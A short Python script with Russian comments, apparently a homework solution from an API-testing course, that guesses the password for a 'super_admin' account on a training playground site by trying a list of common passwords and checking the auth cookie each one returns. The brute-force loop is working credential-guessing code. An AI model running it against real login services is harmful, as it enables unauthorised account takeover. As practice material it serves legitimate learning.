import requests

# список паролей, который нужно перебрать и найти подходящий
passwords = ["123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "1111111",
             "abc123",
             "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "5555555", "lovely", "7777777", "welcome",
             "888888",
             "princess", "dragon", "password1", "123qwe"]

# цикл проверяющий список паролей и подбирающий нужный
for password in passwords:
    auth_response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
                                  data={"login": "super_admin", "password": password})  # запрос получения кук по паролю
    cookie = auth_response.cookies.get("auth_cookie")  # получение значения кук
    cookies = {"auth_cookie": cookie}  # создание словаря для передачи кук

    check_auth_response = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie",
                                        cookies=cookies)  # Запрос проверки авторизации

    # Проверка авторизации и вывод пароля
    if check_auth_response.text == "You are authorized":
        print(check_auth_response.text)
        print("Your password: {}".format(password))
        break
